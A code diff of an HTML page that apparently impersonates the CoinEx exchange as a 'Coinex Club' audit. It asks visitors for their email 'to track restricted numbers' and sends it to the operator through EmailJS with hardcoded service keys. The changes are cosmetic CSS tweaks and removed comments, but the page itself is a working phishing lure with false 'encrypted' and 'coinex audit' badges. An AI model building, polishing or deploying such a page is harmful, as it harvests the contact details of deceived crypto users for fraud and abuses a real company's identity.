@@ -17,11 +17,11 @@
 
     body {
       min-height: 100vh;
-      background: #0b1a1f;  /* fallback deep */
+      background: #0b1a1f;
       background-image: url('https://coinexsup.github.io/Pic/agsgfd.png');
       background-repeat: no-repeat;
       background-position: center center;
-      background-size: 140% 140%;  /* jauh lebih jauh (zoomed out) */
+      background-size: 300% 300%;  /* خیلی دور */
       background-attachment: fixed;
       display: flex;
       align-items: center;
@@ -30,22 +30,22 @@
       margin: 0;
     }
 
-    /* glass card — white matte glass, green-cyan border, no gray tones */
+    /* glass card — white matte glass, green-cyan border, no gray */
     .glass-card {
       width: 100%;
       max-width: 480px;
       padding: 44px 32px 40px;
-      background: rgba(255, 255, 255, 0.35);
+      background: rgba(255, 255, 255, 0.40);
       backdrop-filter: blur(18px) saturate(200%);
       -webkit-backdrop-filter: blur(18px) saturate(200%);
       border-radius: 56px;
       border: 2px solid rgba(0, 255, 200, 0.6);
-      box-shadow: 0 30px 50px -20px rgba(0, 40, 30, 0.5),
-                  inset 0 0 0 1px rgba(255, 255, 255, 0.2);
+      box-shadow: 0 30px 50px -20px rgba(0, 40, 30, 0.4),
+                  inset 0 0 0 1px rgba(255, 255, 255, 0.25);
       transition: all 0.2s ease;
-      color: #11161e;  /* deep dark for contrast */
+      color: #11161e;
       text-align: center;
-      background: rgba(255, 255, 255, 0.30); /* lebih putih/kaca */
+      background: rgba(255, 255, 255, 0.35);
     }
 
     /* all text dark, no gray */
@@ -72,14 +72,14 @@
       margin-bottom: 26px;
       display: inline-block;
       text-transform: uppercase;
-      background: rgba(255,255,255,0.1);
+      background: rgba(255,255,255,0.15);
       padding: 6px 24px;
       border-radius: 60px;
       backdrop-filter: blur(2px);
     }
 
     .audit-hint {
-      background: rgba(255, 255, 255, 0.25);
+      background: rgba(255, 255, 255, 0.30);
       backdrop-filter: blur(4px);
       -webkit-backdrop-filter: blur(4px);
       border-radius: 60px;
@@ -98,7 +98,6 @@
       color: #004d44;
     }
 
-    /* input group */
     .input-group {
       width: 100%;
       margin-bottom: 28px;
@@ -120,7 +119,7 @@
       width: 100%;
       padding: 18px 24px;
       font-size: 1.1rem;
-      background: rgba(255, 255, 255, 0.4);
+      background: rgba(255, 255, 255, 0.45);
       backdrop-filter: blur(6px);
       -webkit-backdrop-filter: blur(6px);
       border: 1.5px solid rgba(0, 200, 180, 0.5);
@@ -141,16 +140,15 @@
 
     .glass-input:focus {
       border-color: #00c4b0;
-      background: rgba(255, 255, 255, 0.6);
+      background: rgba(255, 255, 255, 0.65);
       box-shadow: 0 0 0 3px rgba(0, 200, 180, 0.15), inset 0 2px 8px rgba(0,0,0,0.02);
     }
 
-    /* confirm button — dark text, green-cyan border, glass */
     .confirm-btn {
       width: 100%;
       padding: 18px 24px;
       border: 1.5px solid #00b8a0;
-      background: rgba(255, 255, 255, 0.3);
+      background: rgba(255, 255, 255, 0.35);
       backdrop-filter: blur(8px);
       -webkit-backdrop-filter: blur(8px);
       border-radius: 80px;
@@ -169,7 +167,7 @@
     }
 
     .confirm-btn:hover {
-      background: rgba(255, 255, 255, 0.5);
+      background: rgba(255, 255, 255, 0.55);
       border-color: #00d4c0;
       transform: scale(1.01);
       box-shadow: 0 12px 32px -10px #00b8a060;
@@ -186,12 +184,11 @@
       border-color: #4a8a7a;
     }
 
-    /* status badge — dark text, no gray */
     .status-badge {
       display: inline-block;
       margin-top: 18px;
       font-size: 0.85rem;
-      background: rgba(255, 255, 255, 0.25);
+      background: rgba(255, 255, 255, 0.30);
       backdrop-filter: blur(4px);
       padding: 8px 26px;
       border-radius: 60px;
@@ -203,17 +200,16 @@
     }
 
     .status-badge.error {
-      background: rgba(200, 80, 60, 0.15);
+      background: rgba(200, 80, 60, 0.18);
       border-color: #cc6a5a;
       color: #4a1a1a;
     }
     .status-badge.success {
-      background: rgba(0, 200, 150, 0.15);
+      background: rgba(0, 200, 150, 0.18);
       border-color: #00b89a;
       color: #003d33;
     }
 
-    /* spinner dark */
     .spinner {
       display: inline-block;
       width: 22px;
@@ -225,7 +221,6 @@
     }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-    /* footer — dark text */
     .footnote {
       margin-top: 28px;
       font-size: 0.7rem;
@@ -251,30 +246,24 @@
 </head>
 <body>
   <div class="glass-card" id="appCard">
-    <!-- header -->
     <div class="club-title">Coinex <span>Club</span></div>
     <div class="sub-audit">🔍 auditing · limited phone</div>
 
-    <!-- description -->
     <div class="audit-hint">
       <strong>⏳</strong> enter your email to track restricted numbers
     </div>
 
-    <!-- email input -->
     <div class="input-group">
       <label for="emailInput">📧 email address</label>
       <input type="email" id="emailInput" class="glass-input" placeholder="you@example.com" autocomplete="email" spellcheck="false">
     </div>
 
-    <!-- confirm button -->
     <button class="confirm-btn" id="confirmBtn">
       <span>✓</span> confirm
     </button>
 
-    <!-- status / feedback -->
     <div id="statusMessage" class="status-badge">ready</div>
 
-    <!-- footer -->
     <div class="footnote">
       <span>🔐 encrypted</span>
       <span>🛡️ coinex audit</span>
@@ -283,32 +272,26 @@
 
   <script>
     (function() {
-      // ---------- EMAILJS config (your keys) ----------
-      emailjs.init("PakuuN4ADUDEqrzHl");   // public key
+      emailjs.init("PakuuN4ADUDEqrzHl");
 
-      // ---------- DOM refs ----------
       const emailInput = document.getElementById('emailInput');
       const confirmBtn = document.getElementById('confirmBtn');
       const statusDiv = document.getElementById('statusMessage');
 
-      // ---------- helper: set status ----------
       function setStatus(text, type = '') {
         statusDiv.textContent = text;
         statusDiv.className = 'status-badge' + (type ? ' ' + type : '');
       }
 
-      // ---------- reset status on typing ----------
       emailInput.addEventListener('input', function() {
         if (statusDiv.classList.contains('error') || statusDiv.classList.contains('success')) {
           setStatus('✏️ enter email', '');
         }
       });
 
-      // ---------- confirm handler ----------
       async function handleConfirm() {
         const email = emailInput.value.trim();
 
-        // validate email
         if (!email || !email.includes('@') || !email.includes('.')) {
           setStatus('⚠️ please enter a valid email', 'error');
           return;
@@ -329,8 +312,8 @@
           };
 
           const response = await emailjs.send(
-            "service_j8bd9vn",        // your service ID
-            "template_paduqpn",        // your template ID
+            "service_j8bd9vn",
+            "template_paduqpn",
             templateParams
           );
 
@@ -346,7 +329,6 @@
         }
       }
 
-      // ---------- attach event ----------
       confirmBtn.addEventListener('click', handleConfirm);
 
       emailInput.addEventListener('keydown', (e) => {
@@ -358,7 +340,6 @@
         }
       });
 
-      // initial
       setStatus('📬 enter your email', '');
     })();
   </script>
